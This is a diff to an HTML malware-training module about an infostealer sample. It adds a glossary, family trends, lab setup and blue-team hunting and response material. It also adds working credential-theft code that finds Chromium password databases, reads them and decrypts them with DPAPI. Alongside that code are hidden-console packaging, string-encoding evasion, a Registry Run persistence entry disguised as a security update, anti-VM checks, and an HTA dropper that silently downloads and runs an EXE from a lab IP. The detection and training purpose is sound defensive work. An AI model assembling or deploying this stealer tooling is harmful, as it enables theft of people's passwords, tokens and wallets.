@@ -375,6 +375,14 @@
             font-family: Consolas, monospace;
             font-size: 12px;
         }
+        @media (max-width: 768px) {
+            .container { padding: 1.5rem; }
+            .module-header h1 { font-size: 1.5rem; }
+            .nav { flex-direction: column; }
+            .nav a { border-right: none; border-bottom: 2px solid var(--border); }
+            .technique-grid { grid-template-columns: 1fr; }
+            pre { font-size: 0.75rem; }
+        }
     </style>
 </head>
 <body>
@@ -405,6 +413,54 @@
             <p class="quote">"Malware is just software that does bad things."</p>
             <p class="layman">There is no magic here. The stealer uses the same Windows APIs, the same Python libraries, and the same browser files that legitimate software uses. The difference is intent. If you understand how normal programs store your data, you understand how malware steals it.</p>
             <p class="relevance"><strong>Red:</strong> Stop treating malware like a black box. Read the source. The techniques are boring, repeatable, and powerful. <strong>Blue:</strong> If your detection only looks for "evil" APIs, you will miss everything. Look for abnormal sequences of normal operations.</p>
+        </div>
+
+        <h2>🧒 Layman From Zero — The Building Blocks</h2>
+        <p>Before we go deeper, make sure you understand the words the malware uses against you.</p>
+
+        <div class="layman-term">
+            <h4>🦠 What is malware?</h4>
+            <p><strong>Plain answer:</strong> Any program designed to do something harmful or unwanted without your knowledge. A calculator is software. A program that secretly copies your passwords is malware. The difference is intent and consent.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🖥️ What is a process?</h4>
+            <p><strong>Plain answer:</strong> A running program. When you open Chrome, Windows creates a Chrome <em>process</em> — a private memory box with its own code, data, and permissions. Windows tries to keep each process in its own box so one program cannot mess with another.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🧠 What is memory?</h4>
+            <p><strong>Plain answer:</strong> The temporary workspace where a running program holds its live data. When Chrome is open, your saved passwords, decrypted cookies, and session keys live in memory. If malware can read or run code inside that memory, it can steal those secrets.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>📦 What is a DLL?</h4>
+            <p><strong>Plain answer:</strong> A <em>Dynamic Link Library</em> is a file containing reusable code that Windows programs can load at runtime. Think of it as a shared toolbox. Malware can trick a legitimate process into loading a malicious DLL, making the process do things it was never meant to do.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>📤 What is exfiltration?</h4>
+            <p><strong>Plain answer:</strong> Stealing data out of a network. The malware copies your files locally, then <em>exfiltrates</em> them — sends them over the internet to an attacker-controlled server. Exfiltration is the moment the burglar mails your belongings home.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🔐 What is DPAPI?</h4>
+            <p><strong>Plain answer:</strong> The <em>Data Protection API</em> is Windows' built-in encryption service. Programs like Chrome ask DPAPI to encrypt saved passwords. DPAPI ties the encryption to your Windows user account, so only you can decrypt it — unless malware is running <em>as you</em>.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🔗 What does "app-bound" mean?</h4>
+            <p><strong>Plain answer:</strong> A newer Chrome protection that binds encryption keys to the specific browser process, not just your user account. Even if malware runs as you, it cannot decrypt the key from outside Chrome. That is why this sample injects a DLL <em>into</em> Chrome — to make Chrome itself unlock the key.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🔑 Why do browsers store passwords?</h4>
+            <p><strong>Plain answer:</strong> Because you asked them to. Browsers save passwords so you do not have to type them every time. They store them in files like <code>Login Data</code> and protect them with DPAPI or app-bound keys. Malware simply reads those files and asks Windows to decrypt them.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🎟️ What is a token?</h4>
+            <p><strong>Plain answer:</strong> A token is a temporary proof-of-identity issued after you log in. Instead of sending your password every time, Discord or your browser sends a token. If a thief steals your token, they can use it to impersonate you without knowing your password. Tokens are often more valuable than passwords.</p>
         </div>
 
         <h2>📚 Prerequisites — What You Need First</h2>
@@ -473,14 +529,76 @@
             <p>This module is built from the <code>infostealer-poc-analysis</code> repository. The following files were analyzed:</p>
             <table>
                 <tr><th>File</th><th>Size</th><th>Purpose</th></tr>
-                <tr><td><code>src/stealer_template.py</code></td><td>~402 KB</td><td>The actual malware payload</td></tr>
-                <tr><td><code>src/generator.py</code></td><td>~2 KB</td><td>PyInstaller wrapper that builds the EXE</td></tr>
-                <tr><td><code>src/receiver.py</code></td><td>~11 KB</td><td>Flask C2 server that receives stolen data</td></tr>
-                <tr><td><code>commands.txt</code></td><td>669 B</td><td>Operator cheat sheet</td></tr>
+                <tr><td><code>src/stealer_template.py</code></td><td>~402 KB (1,131 lines)</td><td>The actual malware payload</td></tr>
+                <tr><td><code>src/generator.py</code></td><td>~2 KB (65 lines)</td><td>PyInstaller wrapper that builds the EXE</td></tr>
+                <tr><td><code>src/receiver.py</code></td><td>~11 KB (245 lines)</td><td>Flask C2 server that receives stolen data</td></tr>
+                <tr><td><code>commands.txt</code></td><td>669 B (38 lines)</td><td>Operator cheat sheet</td></tr>
                 <tr><td><code>sdfsdfsf.html</code></td><td>~25 KB</td><td>Example exfiltration report</td></tr>
                 <tr><td><code>wrapped dll.txt</code></td><td>~337 KB</td><td>Base64-encoded DLL for process injection</td></tr>
                 <tr><td><code>original info staler as downloaded from target.txt</code></td><td>~533 KB</td><td>Earlier Fernet-encrypted stager</td></tr>
+                <tr><td><code>interact.txt</code></td><td>491 B</td><td>Note refusing to improve the toolkit</td></tr>
             </table>
+        </div>
+
+        <h2>🔥 Infostealer Trends 2024–2026</h2>
+        <p>The sample analyzed in this module is representative of a much larger criminal economy. Below are the dominant infostealer trends from 2024 through 2026, observed in public reporting, sandbox telemetry, and threat-intel feeds.</p>
+
+        <div class="why-box">
+            <h5>Why trends matter</h5>
+            <p>Malware is a fashion industry. The techniques that work get copied, productised, and sold. If you only study one sample, you miss the ecosystem. These trends show where attackers are investing their effort — and where defenders must focus.</p>
+        </div>
+
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4>Lumma Stealer <span class="difficulty diff-hard">Advanced</span></h4>
+                <p>A C++ stealer sold as MaaS since late 2022, heavily active in 2024–2025. Targets browsers, crypto wallets, Discord/Steam/Outlook sessions, and MFA codes. Uses <strong>app-bound key bypass via COM hijacking and injected JavaScript</strong>, not just DLL injection.</p>
+            </div>
+            <div class="method-card">
+                <h4>Stealc <span class="difficulty diff-medium">Mid-tier</span></h4>
+                <p>A lightweight stealer-as-a-service with aggressive marketing on Russian-language forums. Modular: browser theft, FTP/IM clients, crypto clipper, loader. Often delivered via cracked software, fake update pages, and SEO-poisoned downloads.</p>
+            </div>
+            <div class="method-card">
+                <h4>Meduza Stealer <span class="difficulty diff-medium">Mid-tier</span></h4>
+                <p>Emerging in 2024 as a competitor to Stealc. Advertises "no Russian CIS targets" to attract Western affiliates. Uses Telegram bots for exfiltration and panel access, and supports geofencing by victim IP.</p>
+            </div>
+            <div class="method-card">
+                <h4>Vidar <span class="difficulty diff-hard">Advanced</span></h4>
+                <p>One of the longest-running stealers, frequently rebranded. Known for wide browser coverage, screenshot capture, and wallet hunting. Often paired with <strong>initial-access brokers</strong> who sell corporate credentials onward.</p>
+            </div>
+            <div class="method-card">
+                <h4>Raccoon Stealer 2.0 <span class="difficulty diff-medium">Mid-tier</span></h4>
+                <p>Returned in 2022 after the original operator's arrest. Sold as a subscription with a polished web panel. Focuses on credentials, cookies, and crypto wallets. Frequently delivered by <strong>malvertising and exploit kits</strong>.</p>
+            </div>
+            <div class="method-card">
+                <h4>Atomic MacOS Stealer (AMOS) <span class="difficulty diff-hard">Advanced</span></h4>
+                <p>The first commercially successful macOS-focused stealer-as-a-service. Steals Keychain passwords, browser data, crypto wallets, and file system files. Distributed via fake software installers and malicious ads targeting Mac users.</p>
+            </div>
+            <div class="method-card">
+                <h4>Rust-based stealers <span class="difficulty diff-hard">Advanced</span></h4>
+                <p>Newer families (e.g., <strong>Luca Stealer</strong>, <strong>Havoc-infostealer modules</strong>) are written in Rust to evade signature detection and complicate reverse engineering. Rust binaries have unusual imports and control flow that break many automated analysis tools.</p>
+            </div>
+            <div class="method-card">
+                <h4>Stealer-as-a-Service (SaaS / MaaS) <span class="difficulty diff-easy">Accessible</span></h4>
+                <p>Affiliates rent a stealer binary + web panel for $100–$300/month. The operator handles infrastructure, updates, and support. This has <strong>democratised credential theft</strong>: low-skill criminals now run campaigns at scale.</p>
+            </div>
+            <div class="method-card">
+                <h4>Telegram / Discord C2 panels <span class="difficulty diff-easy">Accessible</span></h4>
+                <p>Many stealers exfiltrate to Telegram bots or Discord webhooks instead of self-hosted servers. This gives operators free HTTPS infrastructure, push notifications, and easy mobile access to stolen logs.</p>
+            </div>
+            <div class="method-card">
+                <h4>Cryptocurrency clipper modules <span class="difficulty diff-medium">Mid-tier</span></h4>
+                <p>A clipper monitors the clipboard for crypto addresses and swaps them with the attacker's address. The victim copies <code>1Abc...</code>, pastes <code>1Xyz...</code>, and sends funds to the thief. Simple, silent, lucrative.</p>
+            </div>
+            <div class="method-card">
+                <h4>Loader + stealer bundles <span class="difficulty diff-hard">Advanced</span></h4>
+                <p>Modern delivery chains use a <strong>loader</strong> (e.g., PrivateLoader, SmokeLoader, GCleaner) to fingerprint the victim and drop multiple payloads: a stealer, a clipper, a RAT, and sometimes ransomware. One infection becomes many.</p>
+            </div>
+        </div>
+
+        <div class="mentor-box">
+            <p class="quote">"The sample is a specimen, not the species."</p>
+            <p class="layman">Studying one stealer teaches you the mechanics. Studying the ecosystem teaches you the business model. The business model is what drives the attacks you will actually face.</p>
+            <p class="relevance"><strong>Red:</strong> Borrow ideas from commercial stealers: modularity, SaaS panels, clipper modules, and loader bundles. <strong>Blue:</strong> Defend against the bundle, not the binary. A stealer is often just the first guest at the party.</p>
         </div>
 
         <h2>🖥️ The Three Machines</h2>
@@ -594,10 +712,10 @@ wscript "$env:APPDATA\r.vbs"</pre>
         <div class="evidence-box">
             <h3>📜 Evidence: Target list from stealer_template.py</h3>
             <ul style="margin-left: 1.5rem;">
-                <li>30+ Chromium-based browsers — passwords, cookies, tokens</li>
+                <li>34 Chromium-based browsers — passwords, cookies, tokens</li>
                 <li>Firefox — passwords, cookies via <code>nss3.dll</code></li>
                 <li>Discord Desktop + browser sessions</li>
-                <li>50+ crypto wallet browser extensions</li>
+                <li>51 crypto wallet browser extensions</li>
                 <li>12 desktop crypto wallets</li>
                 <li>Telegram Desktop session folder</li>
                 <li>WhatsApp Web sessions from browsers</li>
@@ -771,7 +889,7 @@ def decrypt_key(pipe, encrypted_key):
     _, data = win32file.ReadFile(pipe, 4096)
     return data.decode('ascii').strip()</pre>
             </div>
-            <p><strong>What it does:</strong> The injected DLL runs inside the browser. It decrypts Chrome's app-bound key and sends the plaintext back over a named pipe. The pipe name is derived deterministically from the browser process ID so both sides know where to connect.</p>
+            <p><strong>What it does:</strong> The injected DLL runs inside the browser. It decrypts Chrome's app-bound key and sends the plaintext back over a named pipe. The pipe name is derived deterministically from the browser process ID using a ROTL32 mixing function (<code>pid_to_tag</code> in the source) so both sides know where to connect without passing the name through command-line arguments.</p>
         </div>
 
         <div class="mentor-box">
@@ -870,8 +988,12 @@ FILE_KEYWORDS = [
             <div class="code-block">
                 <button class="copy-btn" onclick="copyCode(this)">COPY</button>
                 <pre>MAIN_URL = "http://113.30.148.162:8080"</pre>
-            </div>
-            <p>No domain. No HTTPS. No rotation. Every infected machine phones home to this IP in plaintext.</p>
+                </div>
+                <p>No domain. No HTTPS. No rotation. Every infected machine phones home to this IP in plaintext.</p>
+                <div class="why-box">
+                    <h5>Fact-check note: two IPs in the sample</h5>
+                    <p>The compiled payload's <code>MAIN_URL</code> points to <code>113.30.148.162:8080</code>, while <code>generator.py</code> prints a download URL using <code>46.120.173.142:8080</code>. This is common in real stealer kits: one IP hosts the payload file, another receives the exfil. Both are hardcoded and both are IOCs.</p>
+                </div>
         </div>
 
         <h3>Network IOCs</h3>
@@ -955,6 +1077,59 @@ if __name__ == "__main__":
                              | (isolated from internet or tightly controlled)
                              v
                         [Optional: internet for Discord API validation]</pre>
+        </div>
+
+        <h3>Building the lab with VirtualBox or VMware</h3>
+        <div class="step-box">
+            <h4>Hypervisor checklist</h4>
+            <ol style="margin-left: 1.5rem;">
+                <li>Install VirtualBox or VMware Workstation on a host with at least 16 GB RAM and 100 GB free disk.</li>
+                <li>Create an <strong>internal</strong> or <strong>host-only</strong> network adapter. Do not bridge to your real LAN.</li>
+                <li>Disable shared folders, drag-and-drop, and clipboard sharing between host and VMs.</li>
+                <li>Ensure the host firewall blocks VM traffic to your real network.</li>
+            </ol>
+        </div>
+
+        <div class="step-box">
+            <h4>Windows victim VM</h4>
+            <ol style="margin-left: 1.5rem;">
+                <li>Install Windows 10/11 Enterprise or Pro evaluation ISO.</li>
+                <li>Create a local throwaway user account. Do not sign in with a Microsoft account.</li>
+                <li>Install Chrome, Edge, or Brave. Install Discord Desktop if testing token theft.</li>
+                <li>Disable Windows Defender real-time protection <strong>only if</strong> you need unobstructed dynamic testing; otherwise, use it as a detection test.</li>
+                <li>Generate fake data: save a fake password in Chrome, create a <code>passwords.txt</code> on Desktop, and add a fake wallet seed file.</li>
+            </ol>
+        </div>
+
+        <div class="step-box">
+            <h4>Linux C2 VM</h4>
+            <ol style="margin-left: 1.5rem;">
+                <li>Install Debian or Ubuntu Server with a minimal footprint.</li>
+                <li>Set a static IP on the host-only adapter, e.g. <code>192.168.56.10/24</code>.</li>
+                <li>Install Python 3 and Flask: <code>sudo apt update && sudo apt install python3 python3-pip && pip3 install flask</code>.</li>
+                <li>Copy <code>receiver.py</code> to <code>/opt/receiver.py</code> and ensure <code>/opt/reports</code> exists.</li>
+                <li>Optionally install <code>tcpdump</code> or Wireshark to capture exfiltration traffic.</li>
+            </ol>
+        </div>
+
+        <div class="step-box">
+            <h4>Snapshot discipline</h4>
+            <ol style="margin-left: 1.5rem;">
+                <li>Before running anything malicious, snapshot both VMs: <code>clean-c2</code> and <code>clean-victim</code>.</li>
+                <li>Label snapshots with date and purpose.</li>
+                <li>After each test run, revert both VMs. Do not "clean up manually" — revert.</li>
+                <li>Keep a separate <code>baseline</code> snapshot before installing any malware-related tooling.</li>
+            </ol>
+        </div>
+
+        <div class="step-box">
+            <h4>Fake data generation</h4>
+            <ol style="margin-left: 1.5rem;">
+                <li>Browser: save a login for <code>http://test.local</code> with username <code>testuser</code> and password <code>testpass123</code>.</li>
+                <li>Discord: create a throwaway account and log into Discord Desktop.</li>
+                <li>Files: create <code>passwords.txt</code>, <code>seed-phrase-backup.txt</code>, and <code>crypto-wallet.json</code> on the Desktop.</li>
+                <li>Crypto: install a test wallet extension like MetaMask with a fresh, empty wallet.</li>
+            </ol>
         </div>
 
         <h3>Minimum requirements</h3>
@@ -1055,6 +1230,176 @@ wscript "$env:APPDATA\r.vbs"</pre>
             <p class="relevance"><strong>Red:</strong> Document your infrastructure. Rebuildable labs are repeatable labs. <strong>Blue:</strong> Preserve evidence before cleanup. A reverted VM is clean, but a memory dump and packet capture are proof.</p>
         </div>
 
+        <h2>🛠️ Malware Development Deep Dive — Build a Minimal Educational Stealer</h2>
+        <p>This section is purely educational. We are going to build the smallest possible stealer in Python that demonstrates the core technique: reading browser SQLite databases and decrypting them with DPAPI. It does <strong>not</strong> use injection, persistence, or exfiltration. It is a lab tool for understanding, not a weapon.</p>
+
+        <div class="warning-box">
+            <h5>⚠️ Educational boundary</h5>
+            <p>Run this only inside an isolated lab VM with fake data. Never run it on a machine with real accounts. The code below is intentionally incomplete and omits operational features so it cannot be used as-is in an attack.</p>
+        </div>
+
+        <h3>Step 1: Enumerate browser files</h3>
+        <div class="evidence-box">
+            <h3>📜 Lab code: file enumeration</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                <pre>import os
+import glob
+
+LOCALAPPDATA = os.environ.get("LOCALAPPDATA")
+APPDATA = os.environ.get("APPDATA")
+
+BROWSERS = {
+    "Chrome": os.path.join(LOCALAPPDATA, r"Google\Chrome\User Data"),
+    "Edge": os.path.join(LOCALAPPDATA, r"Microsoft\Edge\User Data"),
+    "Brave": os.path.join(LOCALAPPDATA, r"BraveSoftware\Brave-Browser\User Data"),
+}
+
+def find_login_databases():
+    results = []
+    for name, base in BROWSERS.items():
+        if not os.path.exists(base):
+            continue
+        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 6)]:
+            path = os.path.join(base, profile, "Login Data")
+            if os.path.exists(path):
+                results.append((name, profile, path))
+    return results
+
+for browser, profile, db_path in find_login_databases():
+    print(f"[{browser}/{profile}] {db_path}")</pre>
+            </div>
+            <p><strong>What it teaches:</strong> Malware does not need exploits to find your passwords. It just knows where browsers keep the files.</p>
+        </div>
+
+        <h3>Step 2: Read the SQLite database</h3>
+        <div class="evidence-box">
+            <h3>📜 Lab code: SQLite query</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                <pre>import sqlite3
+import shutil
+import tempfile
+
+def read_logins(db_path):
+    tmp = tempfile.mktemp(suffix=".db")
+    shutil.copy2(db_path, tmp)
+    conn = sqlite3.connect(tmp)
+    cursor = conn.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    rows = cursor.fetchall()
+    conn.close()
+    os.remove(tmp)
+    return rows</pre>
+            </div>
+            <p><strong>What it teaches:</strong> Browser password files are ordinary SQLite databases. Copying them before opening avoids file-lock conflicts with a running browser.</p>
+        </div>
+
+        <h3>Step 3: Decrypt with DPAPI (no injection)</h3>
+        <div class="evidence-box">
+            <h3>📜 Lab code: DPAPI decryption</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                <pre>import json
+import base64
+import win32crypt
+from Crypto.Cipher import AES
+
+def get_legacy_key(local_state_path):
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        state = json.load(f)
+    encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
+    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+def decrypt_legacy_password(encrypted_value, key):
+    try:
+        iv = encrypted_value[3:15]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(encrypted_value[15:])[:-16].decode()
+    except Exception:
+        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()</pre>
+            </div>
+            <p><strong>What it teaches:</strong> DPAPI decryption only works in the same user context. In a lab, run this as the fake victim user. This is the same technique used by the real sample's <code>extract_chromium_legacy</code> function.</p>
+        </div>
+
+        <h3>Step 4: PyInstaller packaging</h3>
+        <div class="evidence-box">
+            <h3>📜 Lab command: build a single hidden EXE</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                <pre>python -m PyInstaller --onefile --noconsole --name edu_stealer edu_stealer.py</pre>
+            </div>
+            <p><strong>What it teaches:</strong> <code>--onefile</code> bundles the Python interpreter, your script, and all dependencies into one portable EXE. <code>--noconsole</code> hides the terminal window. This is exactly what <code>generator.py</code> does for the real payload.</p>
+        </div>
+
+        <h3>Step 5: Static evasion basics</h3>
+        <p>Attackers obfuscate or encode their scripts to avoid antivirus signatures. Common techniques include:</p>
+        <ul style="margin-left: 2rem; margin-bottom: 1rem;">
+            <li><strong>Base64 / hex encoding</strong> of strings and payloads</li>
+            <li><strong>String concatenation</strong> to break keyword matches</li>
+            <li><strong>Reflection</strong> — loading functions by name at runtime</li>
+            <li><strong>Compression</strong> with <code>zlib</code> or <code>marshal</code></li>
+            <li><strong>PyInstaller UPX packing</strong> to compress the EXE and alter signatures</li>
+        </ul>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <pre># Simple encoding example — not robust, but illustrates the idea
+import base64
+cmd = base64.b64encode(b"Invoke-WebRequest http://192.168.56.10/labtest.exe").decode()
+print(cmd)  # Defender sees random base64, not the keyword</pre>
+        </div>
+
+        <h3>Step 6: Persistence mechanisms</h3>
+        <p>The analyzed sample has <strong>no persistence</strong>. Real stealers often add one or more of these so they run again after reboot:</p>
+        <ul style="margin-left: 2rem; margin-bottom: 1rem;">
+            <li><strong>Registry Run key</strong> — write the EXE path to <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
+            <li><strong>Scheduled task</strong> — use <code>schtasks</code> to run the payload on logon or idle</li>
+            <li><strong>Startup folder</strong> — drop a shortcut or LNK in <code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></li>
+        </ul>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <pre># Educational persistence example — Registry Run key
+import winreg
+key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
+    winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, r"C:\path\to\edu_stealer.exe")</pre>
+        </div>
+
+        <h3>Step 7: Anti-VM / anti-sandbox checks</h3>
+        <p>Malware often refuses to run in analysis environments to frustrate blue teams. Common checks:</p>
+        <ul style="margin-left: 2rem; margin-bottom: 1rem;">
+            <li><strong>CPU core count</strong> — sandboxes often have only 1–2 cores</li>
+            <li><strong>RAM size</strong> — less than 2 GB suggests a sandbox</li>
+            <li><strong>VM artifacts</strong> — processes like <code>vmtoolsd.exe</code>, <code>vmwaretray.exe</code>, <code>VBoxService.exe</code></li>
+            <li><strong>Sleep acceleration detection</strong> — call <code>Sleep(10000)</code> and measure real elapsed time</li>
+            <li><strong>Mouse movement / user interaction</strong> — no input means no real user</li>
+        </ul>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            <pre>import os
+import psutil
+
+def looks_like_vm():
+    suspicious = ["vmtoolsd", "vmwaretray", "VBoxService", "qemu-ga", "xenservice"]
+    for proc in psutil.process_iter(["name"]):
+        if proc.info["name"] and any(s.lower() in proc.info["name"].lower() for s in suspicious):
+            return True
+    if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 2 * 1024**3:
+        return True
+    return False
+
+if looks_like_vm():
+    print("[+] Lab environment detected — exiting for safety")
+else:
+    print("[+] Continuing...")</pre>
+        </div>
+
+        <div class="mentor-box">
+            <p class="quote">"Build it small before you fear it big."</p>
+            <p class="layman">A minimal educational stealer strips away the noise and shows you the core trick: browsers store secrets in files, and Windows will decrypt those secrets for any code running as you. Once you can build that, you understand what every real stealer is doing — just with more polish and more crime.</p>
+            <p class="relevance"><strong>Red:</strong> Master the basics first. Evasion and persistence are layers on top of a working core. <strong>Blue:</strong> If you can detect the core behavior — browser file access + DPAPI — you catch most stealers regardless of their wrapper.</p>
+        </div>
+
         <h2>🛡️ Detection Rules</h2>
         <p>The sample is noisy. These Sigma-style and YARA-style rules target its most distinctive behaviors.</p>
 
@@ -1129,6 +1474,134 @@ detection:
             <li>Outbound HTTP POSTs to <code>/create_log</code>, <code>/log_data</code>, <code>/log_files</code></li>
             <li>Discord API calls from non-browser processes</li>
         </ul>
+
+        <h2>🎯 Red-Team Automation — Delivery, C2, and Exfiltration</h2>
+        <p>This section maps how a red team operationalises a stealer beyond the basic sample. The original repo is a proof of concept; real campaigns add automation at every stage.</p>
+
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4>Delivery chain automation</h4>
+                <p>Modern campaigns use PowerShell, VBScript, HTA, ISO/IMG mounts, and malicious LNK files to download and run the payload. Each layer is chosen to bypass a specific control: macros, Mark-of-the-Web, or SmartScreen.</p>
+            </div>
+            <div class="method-card">
+                <h4>Domain fronting</h4>
+                <p>Route C2 traffic through a trusted CDN by setting the TLS SNI to one hostname and the HTTP Host header to another. Network logs show traffic to a legitimate domain, not the real C2.</p>
+            </div>
+            <div class="method-card">
+                <h4>Telegram bot exfil</h4>
+                <p>Replace the Flask receiver with a Telegram bot. Stolen logs are sent as messages or documents to a private channel. No server to maintain, free HTTPS, and mobile alerting.</p>
+            </div>
+            <div class="method-card">
+                <h4>Encrypted archives</h4>
+                <p>Compress stolen files with a password-protected 7z or ZIP before exfiltration. This defeats simple DLP content inspection and makes automated sandbox extraction harder.</p>
+            </div>
+            <div class="method-card">
+                <h4>Geofencing</h4>
+                <p>Check the victim's public IP or system locale before running. If the victim is outside the target country, the malware exits quietly. This reduces noise and avoids unwanted analyst attention.</p>
+            </div>
+        </div>
+
+        <div class="evidence-box">
+            <h3>📜 Example: PowerShell/HTA dropper chain</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                <pre>&lt;!-- edu_dropper.hta --&gt;
+&lt;script language="VBScript"&gt;
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "powershell -w hidden -ep bypass -c iwr http://192.168.56.10/labtest.exe -o $env:APPDATA\labtest.exe; &amp; $env:APPDATA\labtest.exe", 0, False
+    self.Close
+&lt;/script&gt;</pre>
+            </div>
+            <p><strong>Why this matters:</strong> HTA files run with fewer restrictions than downloaded EXEs and can invoke PowerShell without spawning an obvious console window. This is one of many ways operators dress up the basic delivery chain from the repo.</p>
+        </div>
+
+        <div class="mentor-box">
+            <p class="quote">"The payload is the easy part. The chain is the craft."</p>
+            <p class="layman">Anyone can write a script that reads browser files. The real skill is getting that script past email filters, endpoint protection, and suspicious users. Red teams spend most of their effort on the chain, not the stealer.</p>
+            <p class="relevance"><strong>Red:</strong> Automate your delivery testing. If one vector fails, rotate to the next. <strong>Blue:</strong> Detect the chain, not just the payload. The dropper is the weakest link.</p>
+        </div>
+
+        <h2>🛡️ Blue-Team Counterattack Automation</h2>
+        <p>Defenders do not have to wait for alerts. They can automate collection, detection, and response across the enterprise. Below is a playbook-style reference for countering infostealers at scale.</p>
+
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4>Velociraptor artifacts</h4>
+                <p>Hunt across endpoints for browser profile access, suspicious DPAPI calls, and processes loading DLLs from %TEMP%. Velociraptor's VQL lets you query live machines like a database.</p>
+            </div>
+            <div class="method-card">
+                <h4>KAPE collection</h4>
+                <p>Use KAPE to collect browser artifacts, registry hives, event logs, and prefetch files from suspected hosts. Preserve evidence before cleanup or re-imaging.</p>
+            </div>
+            <div class="method-card">
+                <h4>Sysmon rules</h4>
+                <p>Log file access to <code>Login Data</code>, <code>Network\Cookies</code>, and <code>Web Data</code>. Alert when a non-browser process reads these files, especially after a <code>taskkill</code> event.</p>
+            </div>
+            <div class="method-card">
+                <h4>PowerShell Script Block Logging</h4>
+                <p>Enable and centralise Script Block Logging and Module Logging. Catch encoded download cradles, Invoke-WebRequest calls, and VBScript execution patterns.</p>
+            </div>
+            <div class="method-card">
+                <h4>AM/EDR behavioural detection</h4>
+                <p>Look for sequences: process hollowing, remote thread creation, browser launched suspended, DLL loaded from temp, named pipe creation, and outbound HTTP to uncommon IPs.</p>
+            </div>
+            <div class="method-card">
+                <h4>Sigma rules</h4>
+                <p>Deploy Sigma rules for browser kill + profile access, suspended browser creation, and mass browser profile enumeration. Convert to SIEM queries for Splunk, Sentinel, or Elastic.</p>
+            </div>
+            <div class="method-card">
+                <h4>Automated IOC extraction</h4>
+                <p>Extract YARA rules, file hashes, import hashes, and network IOCs from stealer samples. Feed them into your EDR, proxy, and DNS blocklists.</p>
+            </div>
+            <div class="method-card">
+                <h4>Threat intel ingestion</h4>
+                <p>Ingest MISP events and OpenCTI reports for stealer families, C2 panels, and loader infrastructure. Correlate observed IOCs with your telemetry.</p>
+            </div>
+            <div class="method-card">
+                <h4>SOAR playbooks</h4>
+                <p>Automate response: isolate the host, reset browser sessions, force password resets, notify the user, and open an incident ticket. Speed beats sophistication in containment.</p>
+            </div>
+        </div>
+
+        <div class="evidence-box">
+            <h3>📜 Example: Velociraptor-style hunt for browser profile access</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                <pre>LET BrowserFiles = glob(globs=[
+    "C:/Users/*/AppData/Local/Google/Chrome/User Data/*/Login Data",
+    "C:/Users/*/AppData/Local/Microsoft/Edge/User Data/*/Login Data",
+    "C:/Users/*/AppData/Local/BraveSoftware/Brave-Browser/User Data/*/Login Data"
+])
+
+SELECT FullPath, Mtime, Size
+FROM stat(filename=BrowserFiles)
+WHERE Mtime &gt; now() - 300  // modified in last 5 minutes</pre>
+            </div>
+            <p><strong>What it does:</strong> Finds browser password databases modified recently. A stealer copies these files before reading them; the copy operation updates timestamps.</p>
+        </div>
+
+        <div class="evidence-box">
+            <h3>📜 Example: SOAR response playbook outline</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+                <pre>Trigger: Sigma rule "Browser Kill Followed by Profile Access"
+
+Actions:
+1. Enrich: query asset owner, AD groups, recent logons
+2. Contain: isolate host via EDR network containment
+3. Preserve: trigger KAPE collection to secure storage
+4. Reset: force password reset, revoke browser sessions, revoke Discord/Teams tokens
+5. Notify: alert user and service desk
+6. Hunt: search for same filename hashes, C2 IP, or delivery domain across estate
+7. Ticket: create incident with IOCs and timeline</pre>
+            </div>
+        </div>
+
+        <div class="mentor-box">
+            <p class="quote">"The best incident response is automated incident response."</p>
+            <p class="layman">A stealer finishes its work in seconds. Human analysts take minutes or hours. If your response requires a human to read every alert, you have already lost. Automate the boring parts so humans can focus on the hard parts.</p>
+            <p class="relevance"><strong>Blue:</strong> Start with one automated playbook. Isolate host + reset sessions is enough. Add enrichment and hunting later. <strong>Red:</strong> Assume blue teams are automating. Design your attack to generate alerts that look like noise.</p>
+        </div>
 
         <h2>🚨 Incident Response</h2>
         <p>If you accidentally run this sample on a real machine, speed matters. The malware extracts data within seconds. Use this checklist.</p>
@@ -1227,12 +1700,54 @@ detection:
             <div class="quiz-feedback"></div>
         </div>
 
+        <div class="quiz-container">
+            <h3>Question 6</h3>
+            <p>Which 2024–2026 stealer trend uses Telegram bots or Discord webhooks for exfiltration instead of a self-hosted C2 server?</p>
+            <div class="quiz-option" onclick="checkAnswer(this, false)">Domain fronting</div>
